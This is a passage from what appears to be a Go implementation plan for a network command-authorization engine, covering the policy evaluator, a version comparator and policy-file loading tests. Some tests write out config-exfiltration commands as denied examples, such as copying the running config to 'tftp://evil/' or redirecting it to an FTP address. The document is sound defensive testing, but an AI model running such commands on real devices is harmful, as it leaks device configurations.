// matches whatever case the device sends, and `(?-i)` opts a regex out.
func TestComparisonIsCaseInsensitiveAndTheVectorIsNot(t *testing.T) {
	p := program(t, true, "r:permit show run", "r:permit interface /(?-i)^Ethernet1$/",
		"r:permit **", "m:deny interface @management")
	o := expect(t, p, "SHOW RUN", true, decision.PermitDominates)
	if o.Decided.Rule != "show run" || !reflect.DeepEqual(o.Vector, []string{"SHOW", "RUN"}) {
		t.Errorf("matched %+v on vector %q; the vector must be left as received", o.Decided, o.Vector)
	}
	expect(t, p, "interface MANAGEMENT1", false, decision.NoPermitDominatesDeny)
	if o := p.Command(cmd("interface Ethernet1")); o.Decided.Rule != "interface /(?-i)^Ethernet1$/" {
		t.Errorf("the case-sensitive regex matches its own case: %+v", o.Decided)
	}
	if o := p.Command(cmd("interface ethernet1")); o.Decided.Rule != "**" {
		t.Errorf("and not another: %+v", o.Decided)
	}
}

// Dominance, permitting: an exception at least as precise at every position.
func TestANarrowerPermitDominatesABroaderDeny(t *testing.T) {
	p := program(t, true, "backup:permit show chassis hardware", "cve:deny show chassis **")
	o := expect(t, p, "show chassis hardware", true, decision.PermitDominates)
	if o.Deny == nil || o.Deny.Rule != "show chassis **" {
		t.Errorf("the permit's record names the deny it overrode: %+v", o.Deny)
	}
	// Only the deny matches, so it is denied, and no permit is there to name.
	expect(t, p, "show chassis hardware detail", false, decision.NoRuleMatched)
}

// Dominance, denying: each of spec §14's four cases, and equal tuples.
func TestNoPermitDominatesTheseDenies(t *testing.T) {
	for _, tt := range []struct{ permit, deny, line string }{
		{"copy **", "* * /^tftp:/", "copy running-config tftp://evil/"},
		{"copy * *", "* * /^tftp:/", "copy running-config tftp://evil/"},
		{"clear bgp **", "* * all", "clear bgp all"},
		{"interface @physical", "interface /^Ethernet1$/", "interface Ethernet1"},
		{"interface /^Ethernet1$/", "interface @physical", "interface Ethernet1"},
		{"show version", "show version", "show version"},
	} {
		p := program(t, true, "op:permit "+tt.permit, "no_exfil:deny "+tt.deny)
		o := expect(t, p, tt.line, false, decision.NoPermitDominatesDeny)
		if o.Deny == nil || o.Deny.Rule != CanonicalRule(tt.deny) || o.Decided != o.Deny {
			t.Errorf("%q vs %q: the record names the deny: %+v", tt.permit, tt.deny, o.Deny)
		}
	}
}

// Buying it back: the destination has to be named too.
func TestAnExceptionMustBeAsPreciseAtEveryPosition(t *testing.T) {
	yes := program(t, true, "backup:permit copy running-config @backup_targets", "no_exfil:deny * * /^scp:/")
	expect(t, yes, "copy running-config scp://backup.example.com/leaf1", true, decision.PermitDominates)
	no := program(t, true, "backup:permit copy running-config *", "no_exfil:deny * * /^scp:/")
	expect(t, no, "copy running-config scp://backup.example.com/leaf1", false, decision.NoPermitDominatesDeny)
}

// Output modifiers are allow-listed, and every stage is checked on its own.
func TestEveryPipelineStageIsChecked(t *testing.T) {
	p := program(t, true, "r:permit show **")
	o := expect(t, p, "show running-config | redirect ftp://10.9.9.9/cfg", false, decision.PipeStageDenied)
	if o.Stage != 1 || !reflect.DeepEqual(o.Vector, []string{"show", "running-config"}) ||
		!reflect.DeepEqual(o.Pipeline, [][]string{{"redirect", "ftp://10.9.9.9/cfg"}}) {
		t.Errorf("split: %q %q stage %d", o.Vector, o.Pipeline, o.Stage)
	}
	expect(t, p, "show run | section bgp | include neighbor", true, decision.PermitDominates)
	if o := expect(t, p, "show run | section bgp | append flash:x", false, decision.PipeStageDenied); o.Stage != 2 {
		t.Errorf("the second stage is the one refused: %d", o.Stage)
	}
	if o := p.Command(cmd("show run |")); o.Reason != decision.PipeStageDenied {
		t.Errorf("an empty stage matches no allowlist entry: %+v", o)
	}
}

// Spec §3 rule 4, on a platform that may send what was typed: an abbreviation
// of a deny's word is denied, never slipped past it, and a permit is matched
// only as written — so an abbreviated command is denied or matched, never
// silently unmatched by the deny it abbreviates.
func TestAnAbbreviationCannotSlipPastADeny(t *testing.T) {
	typed := program(t, false, "admin:permit **", "no_disruptive:deny reload **")
	o := expect(t, typed, "rel", false, decision.NoPermitDominatesDeny)
	if o.Deny.Rule != "reload **" || !reflect.DeepEqual(o.Deny.Specificity, []int{3}) {
		t.Errorf("the abbreviation matched the deny's word: %+v", o.Deny)
	}
	expect(t, typed, "sh run", true, decision.PermitDominates)
	ro := program(t, false, "ro:permit show **")
	expect(t, ro, "sh run", false, decision.NoRuleMatched)
	resolved := program(t, true, "admin:permit **", "no_disruptive:deny reload **")
	expect(t, resolved, "rel", true, decision.PermitDominates)
}

// Specificity is a property of the rule and the command, never of position, so
// shuffling the rules changes no outcome, not even which rule is named
// (spec §5.4; §14, "Order independence").
func TestEvaluationIsOrderIndependent(t *testing.T) {
	lines := []string{"a:permit show **", "b:permit show chassis hardware", "c:deny show chassis **",
		"d:permit copy running-config *", "e:deny * * /^tftp:/", "f:permit **", "g:deny reload **", "h:permit show **"}
	commands := []string{"show chassis hardware", "show chassis cluster", "copy running-config tftp://x",
		"reload now", "show version", "configure", "show run | redirect x"}
	want := map[string]Outcome{}
	base := program(t, true, lines...)
	for _, c := range commands {
		want[c] = base.Command(cmd(c))
	}
	r := rand.New(rand.NewSource(49))
	for i := 0; i < 20; i++ {
		shuffled := append([]string(nil), lines...)
		r.Shuffle(len(shuffled), func(i, j int) { shuffled[i], shuffled[j] = shuffled[j], shuffled[i] })
		p := program(t, true, shuffled...)
		for _, c := range commands {
			if got := p.Command(cmd(c)); !reflect.DeepEqual(got, want[c]) {
				t.Fatalf("%q under %q:\n got %+v\nwant %+v", c, shuffled, got, want[c])
			}
		}
	}
}

// The record's policy block is spec §5.7's: the deciding permit first, the
// deny it faced, and a server_msg that is printable ASCII naming the rule.
func TestTheOutcomeRendersForTheRecordAndTheDevice(t *testing.T) {
	p := program(t, true, "net_operator:permit copy **", "no_exfil:deny * * /^tftp:/")
	o := p.Command(cmd("copy running-config tftp://10.9.9.9/x"))
	pol := o.Policy("sha256:bundle", "sha256:blob")
	if pol.Bundle != "sha256:bundle" || pol.Blob != "sha256:blob" || pol.MatchedDeny == nil ||
		!reflect.DeepEqual(pol.MatchedDeny.Rule, []string{"*", "*", "/^tftp:/"}) ||
		!reflect.DeepEqual(pol.MatchedDeny.Specificity, []int{1, 1, 2}) || pol.MatchedDeny.Role != "no_exfil" ||
		len(pol.MatchedPermits) != 1 || !reflect.DeepEqual(pol.MatchedPermits[0].Specificity, []int{3, 0, 0}) {
		t.Fatalf("policy block: %+v", pol)
	}
	if msg := o.ServerMsg(); msg != "port49: denied by no_exfil (* * /^tftp:/) - see 'port49 explain'" {
		t.Fatalf("server_msg: %q", msg)
	}
	if msg := (Outcome{Reason: decision.NoPermitDominatesDeny, Deny: &Match{Role: "r", Rule: "show /é/"}}).ServerMsg(); strings.ContainsFunc(msg, func(r rune) bool { return r < 0x20 || r > 0x7e }) {
		t.Fatalf("server_msg is printable ASCII: %q", msg)
	}
	if o := p.Command(cmd("configure")); o.ServerMsg() == "" || strings.Contains(o.ServerMsg(), "configure") {
		t.Fatalf("no_rule_matched says so without echoing the request: %q", o.ServerMsg())
	}
}

// The first permit in sorted order does not always dominate; the one that
// does decides, goes first, and the record's order is otherwise kept.
func TestTheDominatingPermitDecidesEvenWhenAnotherSortsFirst(t *testing.T) {
	p := program(t, true, "a:permit show chassis *", "b:permit show * cluster", "c:deny show * /^cl/")
	o := expect(t, p, "show chassis cluster", true, decision.PermitDominates)
	if o.Decided.Role != "b" || o.Permits[0].Role != "b" || len(o.Permits) != 2 {
		t.Fatalf("decided %+v, permits %+v", o.Decided, o.Permits)
	}
}
```

- [ ] **Step 2: Run them to see them fail**

Run: `go test ./internal/engine/ -count=1`
Expected: FAIL to build — `undefined: Program`, `undefined: Compile`, `undefined: Outcome`.

- [ ] **Step 3: Write the evaluator**

<!-- write: internal/engine/eval.go -->
```go
package engine

import (
	"regexp"
	"slices"
	"strings"

	"github.com/rhwendt/port49/internal/decision"
)

// Program is a blob with its terms parsed and its patterns compiled, ready to
// decide. It is immutable, so the daemon caches one per hash and shares it
// across every authorization that names that blob (spec §5.1.1).
type Program struct {
	Blob  Blob
	rules []compiled
	pipe  []compiled
}

type compiled struct {
	verdict, rule, role string
	terms               []cterm
}

type cterm struct {
	kind Kind
	word string
	res  []*regexp.Regexp // a regex term's one pattern, or a class's patterns
}

// Compile readies b for evaluation. It fails only where Decode would have, so a
// blob that decoded compiles.
func Compile(b Blob) (*Program, error) {
	if err := b.check(); err != nil {
		return nil, err
	}
	p := &Program{Blob: b}
	for _, r := range b.Rules {
		c, err := compileRule(r.Verdict, r.Rule, r.Role, b.Classes)
		if err != nil {
			return nil, err
		}
		p.rules = append(p.rules, c)
	}
	for _, r := range b.Pipe {
		c, err := compileRule(Permit, r, "", b.Classes)
		if err != nil {
			return nil, err
		}
		p.pipe = append(p.pipe, c)
	}
	return p, nil
}

func compileRule(verdict, rule, role string, classes map[string][]string) (compiled, error) {
	terms, err := ParseRule(rule)
	if err != nil {
		return compiled{}, err
	}
	c := compiled{verdict: verdict, rule: CanonicalRule(rule), role: role}
	for _, t := range terms {
		ct := cterm{kind: t.Kind, word: t.Text}
		var patterns []string
		switch t.Kind {
		case Regex:
			patterns = []string{t.Text}
		case Class:
			patterns = classes[t.Text]
		}
		for _, pat := range patterns {
			re, err := compileTerm(pat)
			if err != nil {
				return compiled{}, err
			}
			ct.res = append(ct.res, re)
		}
		c.terms = append(c.terms, ct)
	}
	return c, nil
}

// match reports whether the rule matches the whole vector and, when it does,
// the specificity tuple: one slot per argument of the command, each holding the
// rank of the term that covered it, with a trailing `**` scoring 0 for every
// argument it absorbs (spec §5.4). There is no implicit prefix match.
//
// abbrev is the fail-closed reading of a platform that may send what the
// operator typed (spec §3 rule 4): a word also matches any non-empty prefix of
// itself, so `rel` matches `reload`. It is only ever asked for denies —
// widening a permit that way would fail open — and it can only make a deny
// match more, so on such a platform an abbreviation is denied or matched as
// written, never slipped past a deny.
func (c compiled) match(vector []string, abbrev bool) ([]int, bool) {
	spec := make([]int, 0, len(vector))
	for i, t := range c.terms {
		if t.kind == Rest {
			for range vector[i:] {
				spec = append(spec, 0)
			}
			return spec, true
		}
		if i >= len(vector) {
			return nil, false
		}
		arg := vector[i]
		switch t.kind {
		case Any:
		case Word:
			if !strings.EqualFold(t.word, arg) && !(abbrev && abbreviates(arg, t.word)) {
				return nil, false
			}
		case Class, Regex:
			hit := false
			for _, re := range t.res {
				if re.MatchString(arg) {
					hit = true
					break
				}
			}
			if !hit {
				return nil, false
			}
		}
		spec = append(spec, t.kind.Rank())
	}
	if len(c.terms) != len(vector) {
		return nil, false
	}
	return spec, true
}

// abbreviates reports whether arg is a proper, non-empty prefix of word,
// ignoring case.
func abbreviates(arg, word string) bool {
	return arg != "" && len(arg) < len(word) && strings.HasPrefix(strings.ToLower(word), strings.ToLower(arg))
}

// Dominates reports whether a permit scoring x dominates a deny scoring y:
// at least as specific at every position and strictly more at one (spec §5.4).
// It is a partial order, and that is the point: two rules that disagree about
// which position matters are incomparable, and the deny stands.
func Dominates(x, y []int) bool {
	if len(x) != len(y) {
		return false
	}
	strict := false
	for i := range x {
		if x[i] < y[i] {
			return false
		}
		if x[i] > y[i] {
			strict = true
		}
	}
	return strict
}

// Match is one rule that matched a command.
type Match struct {
	Rule        string
	Role        string
	Specificity []int
}

// Outcome is one command decision and everything a record, a replay and an
// explanation need to say why.
type Outcome struct {
	Permit bool
	Reason decision.Reason
	// Vector is the normalized command without its pipeline; Pipeline is the
	// stages after it, split at the platform's pipe token (spec §3).
	Vector   []string
	Pipeline [][]string
	// Decided is the rule the verdict rests on: the permit that dominated, or
	// the deny no permit dominated. Nil for no_rule_matched.
	Decided *Match
	// Deny is the record's matched_deny; Permits its matched_permits, the
	// deciding permit first and the rest most specific first.
	Deny    *Match
	Permits []Match
	// Stage is the 1-based pipeline stage a pipe_stage_denied refused.
	Stage int
}

// Normalize turns an authorization request's AV pairs into the command
// vector and its pipeline stages (spec §3): `cmd` then every `cmd-arg`, in
// order, the trailing `<cr>` dropped where the platform sends one, split at
// every argument equal to the pipe token. Arguments are never re-joined and
// their case is never changed. It is exported so a record's `raw` can be
// normalized by the same code that decided it.
func (n Normalize) Normalize(raw []string) (vector []string, pipeline [][]string) {
	var cmd string
	var args []string
	for _, a := range raw {
		i := strings.IndexAny(a, "=*")
		if i < 0 {
			continue
		}
		switch a[:i] {
		case "cmd":
			cmd = a[i+1:]
		case "cmd-arg":
			args = append(args, a[i+1:])
		}
	}
	if n.StripCR && len(args) > 0 && args[len(args)-1] == "<cr>" {
		args = args[:len(args)-1]
	}
	var words []string
	if cmd != "" {
		words = append([]string{cmd}, args...)
	}
	segments := [][]string{{}}
	for _, w := range words {
		if w == n.PipeToken {
			segments = append(segments, []string{})
			continue
		}
		segments[len(segments)-1] = append(segments[len(segments)-1], w)
	}
	return segments[0], segments[1:]
}

// Command decides one command authorization (spec §5.3, from "collect every
// matching rule"): every matching permit and deny is collected; with no permit
// the answer is no_rule_matched; a permit must dominate every matching deny or
// the deny stands; then every pipeline stage must match the pipe allowlist.
// Evaluation is order-independent: which rule is named is decided by the
// tuples, then by role name, then by rule text, never by position in a file.
func (p *Program) Command(raw []string) Outcome {
	vector, pipeline := p.Blob.Normalize.Normalize(raw)
	out := Outcome{Vector: vector, Pipeline: pipeline}
	var permits, denies []Match
	for _, r := range p.rules {
		abbrev := r.verdict == Deny && !p.Blob.Normalize.ExpandsAbbreviations
		if spec, ok := r.match(vector, abbrev); ok {
			m := Match{Rule: r.rule, Role: r.role, Specificity: spec}
			if r.verdict == Permit {
				permits = append(permits, m)
			} else {
				denies = append(denies, m)
			}
		}
	}
	sortMatches(permits)
	sortMatches(denies)
	out.Permits = permits
	if len(permits) == 0 {
		out.Reason = decision.NoRuleMatched
		if len(denies) > 0 {
			out.Deny = &denies[0]
		}
		return out
	}
	best := -1
	for i, pm := range permits {
		if dominatesAll(pm, denies) {
			best = i
			break
		}
	}
	if best < 0 {
		// Name the most specific deny the most specific permit fails to
		// dominate: there is always one, or that permit would have won.
		for i := range denies {
			if !Dominates(permits[0].Specificity, denies[i].Specificity) {
				out.Deny = &denies[i]
				break
			}
		}
		out.Decided = out.Deny
		out.Reason = decision.NoPermitDominatesDeny
		return out
	}
	// The deciding permit goes first; the rest keep their order.
	out.Permits = append([]Match{permits[best]}, slices.Delete(slices.Clone(permits), best, best+1)...)
	out.Decided = &out.Permits[0]
	if len(denies) > 0 {
		out.Deny = &denies[0]
	}
	for i, stage := range pipeline {
		if !p.pipePermits(stage) {
			out.Stage = i + 1
			out.Reason = decision.PipeStageDenied
			return out
		}
	}
	out.Permit, out.Reason = true, decision.PermitDominates
	return out
}

func dominatesAll(pm Match, denies []Match) bool {
	for _, d := range denies {
		if !Dominates(pm.Specificity, d.Specificity) {
			return false
		}
	}
	return true
}

// pipePermits reports whether one stage matches the allowlist. Stages are
// allow-listed, never deny-listed: a blocklist fails open on the next vendor
// extension (spec §4). A stage is matched as written, with no abbreviation,
// which fails closed.
func (p *Program) pipePermits(stage []string) bool {
	for _, r := range p.pipe {
		if _, ok := r.match(stage, false); ok {
			return true
		}
	}
	return false
}

// sortMatches orders matches most specific first — lexicographically greatest
// tuple — then by role name, then by rule text. It is presentation only: it
// decides which rule a record names, never the verdict (spec §5.4, "Ties and
// explain"), and it depends on nothing a file's layout can change.
func sortMatches(ms []Match) {
	slices.SortFunc(ms, func(a, b Match) int {
		if c := slices.Compare(b.Specificity, a.Specificity); c != 0 {
			return c
		}
		if c := strings.Compare(a.Role, b.Role); c != 0 {
			return c
		}
		return strings.Compare(a.Rule, b.Rule)
	})
}

// Policy renders the outcome as a decision record's policy block.
func (o Outcome) Policy(bundle, blob string) *decision.Policy {
	pol := &decision.Policy{Bundle: bundle, Blob: blob, Stage: o.Stage}
	if o.Deny != nil {
		r := o.Deny.record()
		pol.MatchedDeny = &r
	}
	for _, m := range o.Permits {
		pol.MatchedPermits = append(pol.MatchedPermits, m.record())
	}
	return pol
}

func (m Match) record() decision.PolicyRule {
	return decision.PolicyRule{Rule: strings.Fields(m.Rule), Specificity: append([]int(nil), m.Specificity...), Role: m.Role}
}

// ServerMsg is what the device shows the person who typed the command (spec
// §5.3): the rule and role that decided it, which they have just exercised,
// and the instrument, and nothing from the request itself — a server_msg is
// never built from device-supplied bytes. It is printable ASCII, because it
// lands on a console.
func (o Outcome) ServerMsg() string {
	switch o.Reason {
	case decision.NoPermitDominatesDeny:
		return printable("port49: denied by " + o.Deny.Role + " (" + o.Deny.Rule + ") - see 'port49 explain'")
	case decision.PipeStageDenied:
		return "port49: an output modifier in this command is not permitted - see 'port49 explain'"
	case decision.NoRuleMatched:
		return "port49: no rule permits this command - see 'port49 explain'"
	}
	return ""
}

// printable replaces every byte outside printable ASCII, so a rule written
// with a non-ASCII regex cannot put a control sequence on a console.
func printable(s string) string {
	b := []byte(s)
	for i, c := range b {
		if c < 0x20 || c > 0x7e {
			b[i] = '?'
		}
	}
	return string(b)
}
```

- [ ] **Step 4: Run the package**

Run: `go test ./internal/engine/ -count=1 && go vet ./internal/engine/`
Expected: PASS.

- [ ] **Step 5: Commit**

```bash
git add internal/engine/eval.go internal/engine/eval_test.go
git commit -m "feat: the policy evaluator: dominance, pipelines, abbreviations

Normalizes a request's AV pairs (<cr>, pipe split, case kept), matches
the full vector with a specificity tuple per rule, permits only where
one permit dominates every matching deny (spec §5.4), checks every
pipeline stage against the allowlist, and on a platform that may send
abbreviations lets a deny's word match its own prefixes (spec §3 rule
4). Which rule a record names is decided by tuple, role and rule text,
so evaluation is order-independent down to the record.

Co-Authored-By: Claude Opus 5.5 (1M context) <noreply@anthropic.com>
Claude-Session: https://claude.ai/code/session_01KRDnCbmkhchGxXvV99W4mc"
```

---

### Task 7: The generic version comparator

**Files:**
- Create: `internal/policy/version.go`
- Test: `internal/policy/version_test.go`

**Interfaces:**
- Produces: `func CompareVersions(a, b string) (int, bool)` — -1/0/1, and false when the two
  cannot be ordered. Task 9's scopes call it for `lt`, `lte`, `gt`, `gte`.

Spec §5.5's table, verbatim: digit runs compare numerically (by length then lexically, so no run is
too long), letter runs by equality only, a letter against a digit not at all, and a prefix is the
lower. `internal/policy` starts here, with no dependency on anything but the standard library.

- [ ] **Step 1: Write the failing test**

<!-- write: internal/policy/version_test.go -->
```go
package policy

import "testing"

// Spec §5.5's table, row by row, plus the cases that make the comparator
// refuse rather than guess.
func TestCompareVersions(t *testing.T) {
	for _, tt := range []struct {
		a, b string
		want int
		ok   bool
	}{
		{"21.4R2-S9", "21.4R3", -1, true},    // position 3: 2 < 3
		{"21.4R3-S5", "21.4R3", 1, true},     // a service release is newer, not a pre-release
		{"21.4R3-S4", "21.4R3-S5", -1, true}, // the §11 mitigation's boundary
		{"4.31.2F", "4.31.10F", -1, true},    // numeric, not lexical
		{"17.09.04a", "17.09.04", 1, true},   // the shorter is lower: the rebuild is newer
		{"4.31.5M", "4.31.2F", 1, true},      // decided at position 2; the letters never meet
		{"10.2(5a)", "10.2(5a)", 0, true},
		{"4.31.2f", "4.31.2F", 0, true}, // letters are upper-cased
		{"15.2(4)E10", "15.2(4)S10", 0, false},
		{"4.31.2F", "4.31.2M", 0, false}, // letters compare by equality only
		{"21.4X75-D40", "21.4R3-S5", 0, false},
		{"unknown", "21.4R3-S5", 0, false},
		{"", "21.4R3-S5", 0, false},
		{"21.4R3-S5", "21.4R3.5", 0, false}, // a letter run against a digit run
		{"99999999999999999999999.1", "99999999999999999999999.2", -1, true},
		{"007", "7", 0, true},
	} {
		got, ok := CompareVersions(tt.a, tt.b)
		if got != tt.want || ok != tt.ok {
			t.Errorf("CompareVersions(%q, %q) = %d %v, want %d %v", tt.a, tt.b, got, ok, tt.want, tt.ok)
		}
	}
}
```

- [ ] **Step 2: Run it to see it fail**

Run: `go test ./internal/policy/ -count=1`
Expected: FAIL to build — `undefined: CompareVersions` (the package has only its test file).

- [ ] **Step 3: Write the comparator**

<!-- write: internal/policy/version.go -->
```go
package policy

import (
	"strings"
	"unicode"
)

// CompareVersions orders two vendor version strings with the one generic
// comparator of spec §5.5 ("Version comparison"; §13, decision 7): tokenize
// into runs of digits and runs of letters, discarding separators and
// upper-casing letters, then compare element by element — digit runs
// numerically, letter runs by equality only, a letter run against a digit run
// not at all, and a sequence that is a prefix of the other is the lower.
//
// It returns -1, 0 or 1, and false when the two cannot be compared. Semver is
// deliberately not used: it would sort Junos service release `21.4R3-S5`
// below `21.4R3`.
func CompareVersions(a, b string) (int, bool) {
	x, y := versionTokens(a), versionTokens(b)
	if len(x) == 0 || len(y) == 0 {
		return 0, false
	}
	for i := 0; i < len(x) && i < len(y); i++ {
		xn, xNum := x[i].number()
		yn, yNum := y[i].number()
		switch {
		case xNum && yNum:
			if c := xn.cmp(yn); c != 0 {
				return c, true
			}
		case !xNum && !yNum:
			// Letters are equality only: `M > F` means nothing across vendors.
			if x[i] != y[i] {
				return 0, false
			}
		default:
			return 0, false
		}
	}
	switch {
	case len(x) < len(y):
		return -1, true
	case len(x) > len(y):
		return 1, true
	}
	return 0, true
}

type versionToken string

// numeric is a digit run without its leading zeros, compared by length and
// then lexically, so no run is too long to compare.
type numeric string

func (t versionToken) number() (numeric, bool) {
	if t == "" || !unicode.IsDigit(rune(t[0])) {
		return "", false
	}
	s := strings.TrimLeft(string(t), "0")
	return numeric(s), true
}

func (n numeric) cmp(m numeric) int {
	if len(n) != len(m) {
		if len(n) < len(m) {
			return -1
		}
		return 1
	}
	return strings.Compare(string(n), string(m))
}

// versionTokens splits v into digit and letter runs; everything else — `.`,
// `-`, `(`, `)`, `_`, `/`, spaces — separates.
func versionTokens(v string) []versionToken {
	var out []versionToken
	var cur strings.Builder
	kind := 0 // 0 none, 1 digits, 2 letters
	flush := func() {
		if cur.Len() > 0 {
			out = append(out, versionToken(cur.String()))
			cur.Reset()
		}
		kind = 0
	}
	for _, r := range v {
		switch {
		case r >= '0' && r <= '9':
			if kind != 1 {
				flush()
				kind = 1
			}
			cur.WriteRune(r)
		case (r >= 'a' && r <= 'z') || (r >= 'A' && r <= 'Z'):
			if kind != 2 {
				flush()
				kind = 2
			}
			cur.WriteRune(unicode.ToUpper(r))
		default:
			flush()
		}
	}
	flush()
	return out
}
```

- [ ] **Step 4: Run it**

Run: `go test ./internal/policy/ -count=1`
Expected: PASS.

- [ ] **Step 5: Commit**

```bash
git add internal/policy/version.go internal/policy/version_test.go
git commit -m "feat: the generic version comparator

Digit runs numeric, letter runs by equality, incomparable reported
rather than guessed (spec §5.5; decision 7). Semver would sort Junos
21.4R3-S5 below 21.4R3.

Co-Authored-By: Claude Opus 5.5 (1M context) <noreply@anthropic.com>
Claude-Session: https://claude.ai/code/session_01KRDnCbmkhchGxXvV99W4mc"
```

---

### Task 8: The policy file loads, and refuses by name what is not this plan's

**Files:**
- Create: `internal/policy/file.go`, `internal/policy/load.go`, `internal/policy/rank.go`
- Test: `internal/policy/load_test.go`

**Interfaces:**
- Consumes: `engine.ParseRule`, `engine.CanonicalRule`, `engine.CheckAttribute`, `engine.HashOf`
  (Task 5); `platform.Known`, `platform.DialectFor` (Task 4); `token.CanonicalUsername` (plan 3);
  `admission.Device`.
- Produces:
  - `type Env struct { Devices []admission.Device; Dialects map[string]platform.Dialect; EnableUsernames map[string]string }`
  - `type Policy struct { Bundle string; … }`; `func Load(path string, env Env) (*Policy, error)`;
    `func Parse(raw []byte, env Env) (*Policy, error)`.
  - `type Scope`, `type Role`, `type Subject struct { Name, Group string; Identity []string; Domain, Username, Enable string; TokenTTL time.Duration; API []string }`,
    `type Grant struct { Subject, Scope string; Roles []string; MaxPrivilege string; Expires time.Time; Attributes map[string][]string }`,
    `type Test struct { Subject, Principal, Device, Command, Expect, Reason string }`.
  - `func (*Policy) SubjectOf(principal string) (string, bool)`, `Subject(name) (*Subject, bool)`,
    `Grants(subject) []*Grant`, `Devices() []admission.Device`, `Tests() []Test`; unexported
    `dialect(name)` and `device(name)`.
  - `var DefaultPipe []string`; unexported `rankLint(body string) (string, bool)`.
  Tasks 9–11 and 15–19 build on `Policy`.

The whole §11 grammar is read — `privilege_levels` with `parent:`, `scopes` with `match`,
`on_missing`, `security_log` and `attached_roles`, roles with `pipe` and `attributes`, group and
identity subjects with `api:`, grants with `expires` and `attributes`, and `tests:`. The checks here
are the structural ones; the joint checks against inventory arrive in Task 10.

- [ ] **Step 1: Write the failing tests**

<!-- write: internal/policy/load_test.go -->
```go
package policy

import (
	"net/netip"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/rhwendt/port49/internal/admission"
)

// inventory is the devices the policy tests load against: one of each
// shipped platform with a command path, and an SRX, with the attributes spec
// §11's scopes read.
func inventory() []admission.Device {
	dev := func(name, platform, addr string, attrs map[string]string) admission.Device {
		return admission.Device{Name: name, Platform: platform, Addresses: []netip.Addr{netip.MustParseAddr(addr)},
			Attributes: attrs}
	}
	return []admission.Device{
		dev("leaf-01", "arista_eos", "10.0.1.1", map[string]string{"site": "dc1", "role": "leaf"}),
		dev("campus-sw-7", "arista_eos", "10.0.2.7", map[string]string{"site": "campus"}),
		dev("nx-01", "cisco_nxos", "10.0.3.1", map[string]string{"site": "dc2", "role": "spine"}),
		dev("xe-01", "cisco_iosxe", "10.0.4.1", map[string]string{"site": "campus"}),
		dev("srx-fw-04", "juniper_junos", "10.0.5.4", map[string]string{"site": "edge", "os_version": "21.4R3-S4"}),
		dev("srx-fw-05", "juniper_junos", "10.0.5.5", map[string]string{"site": "edge", "os_version": "22.2R1"}),
		dev("srx-fw-22", "juniper_junos", "10.0.5.22", map[string]string{"site": "edge", "os_version": "21.4X75-D40"}),
		dev("srx-lab-01", "juniper_junos", "10.0.5.99", map[string]string{"site": "lab"}),
	}
}

func env() Env { return Env{Devices: inventory()} }

func mustParse(t *testing.T, body string) *Policy {
	t.Helper()
	p, err := Parse([]byte(body), env())
	if err != nil {
		t.Fatal(err)
	}
	return p
}

// good is spec §11's shape, cut to what every platform in inventory() can
// render with the built-in adapters: `operator` has no mapping on arista_eos
// (internal/platform), so no role here lands an EOS session there.
const good = `
scopes:
  - {name: all_devices, match: {}}
  - {name: dc_fabric, match: {site: [dc1, dc2], role: [leaf, spine]}}
roles:
  - {name: read_only, privilege: readonly, permit: [show **, terminal length *]}
  - {name: network_admin, privilege: admin, permit: ["**"], pipe: {permit: ["**"]}}
  - {name: no_disruptive, deny: [reload **, write erase **]}
subjects:
  - {name: netops_admins, group: "CN=netops-admins,OU=Groups,DC=example,DC=com", enable: token, token_ttl: 60s}
  - {name: alice, identity: "user:alice@example.com", username: alice, enable: token, token_ttl: 60s}
  - {name: svc_oxidized, identity: ["system:serviceaccount:netops:oxidized", "spiffe://port49/host/oxidized-01"],
     username: svc-config-backup, token_ttl: 900s, api: [sync]}
grants:
  - {subject: netops_admins, scope: all_devices, roles: [network_admin], max_privilege: admin}
  - {subject: alice, scope: all_devices, roles: [read_only, no_disruptive], expires: 2026-12-01}
  - {subject: svc_oxidized, scope: all_devices, roles: [read_only]}
tests:
  - {subject: alice, device: leaf-01, command: "show version", expect: permit}
`

func TestAGoodPolicyLoads(t *testing.T) {
	p := mustParse(t, good)
	if !strings.HasPrefix(p.Bundle, "sha256:") {
		t.Fatalf("the bundle names the file: %q", p.Bundle)
	}
	for id, want := range map[string]string{"user:alice@example.com": "alice",
		"system:serviceaccount:netops:oxidized": "svc_oxidized", "spiffe://port49/host/oxidized-01": "svc_oxidized"} {
		if got, ok := p.SubjectOf(id); !ok || got != want {
			t.Errorf("SubjectOf(%q) = %q %v, want %q", id, got, ok, want)
		}
	}
	if _, ok := p.SubjectOf("CN=netops-admins,OU=Groups,DC=example,DC=com"); ok {
		t.Error("a group is matched through the directory (plan 7), never as an identity")
	}
	s, _ := p.Subject("svc_oxidized")
	if s.Domain != "machines" || s.Enable != "none" {
		t.Errorf("svc_oxidized: domain %q enable %q", s.Domain, s.Enable)
	}
	if g, _ := p.Subject("netops_admins"); g.Domain != "humans" {
		t.Errorf("a group's members are people: %q", g.Domain)
	}
	if gs := p.Grants("alice"); len(gs) != 1 || gs[0].Expires.Format("2006-01-02T15:04Z07:00") != "2026-12-01T00:00Z" {
		t.Errorf("a date expires at the start of its day, UTC: %+v", gs)
	}
	if r := p.roles["network_admin"]; len(r.Pipe) != 1 || p.roles["read_only"].Pipe != nil {
		t.Error("a declared pipe list replaces the default; an absent one inherits it")
	}
	if len(p.Tests()) != 1 {
		t.Errorf("tests: %+v", p.Tests())
	}
}

// Load names the file on every error, and reads the same bytes Parse does.
func TestLoadNamesTheFile(t *testing.T) {
	path := filepath.Join(t.TempDir(), "policy.yaml")
	if err := os.WriteFile(path, []byte("subjects: []\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	if _, err := Load(path, env()); err == nil || !strings.Contains(err.Error(), path) {
		t.Fatalf("Load = %v, want an error naming %s", err, path)
	}
}

const roleOK = "roles:\n  - {name: r, privilege: admin, permit: [\"**\"]}\n"
const scopeOK = "scopes:\n  - {name: all_devices, match: {}}\n"
const subjOK = "subjects:\n  - {name: s, identity: [\"user:a@example.com\"], username: a, token_ttl: 60s}\n"
const grantOK = "grants:\n  - {subject: s, scope: all_devices, roles: [r]}\n"

// Every refusal names what is wrong and, where another plan owns the key, which
// plan lifts it.
func TestLoadRefusesByName(t *testing.T) {
	for _, tt := range []struct{ name, yaml, want string }{
		{"platform_set", "platform_set: 1.4.0\n" + roleOK + subjOK, "plan 5"},
		{"key_groups", "key_groups: []\n" + roleOK + subjOK, "inventory file"},
		{"platforms", "platforms: {arista_eos: {}}\n" + roleOK + subjOK, "plan 5"},
		{"a role's max_session_age", "roles:\n  - {name: r, max_session_age: 8h}\n" + subjOK, "plan 7"},
